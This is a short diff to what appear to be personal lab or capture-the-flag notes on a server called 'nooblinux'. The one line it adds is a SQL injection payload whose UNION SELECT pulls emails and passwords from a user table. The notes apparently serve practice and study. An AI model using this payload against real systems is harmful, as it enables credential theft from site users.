@@ -117,6 +117,7 @@ server: nooblinux
 .change url action = admin
 .select new usser doit
 .right click view page source , clich ctrl+f;search headen find headen
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 --
 
 7A)
 >>> from scapy.all import *
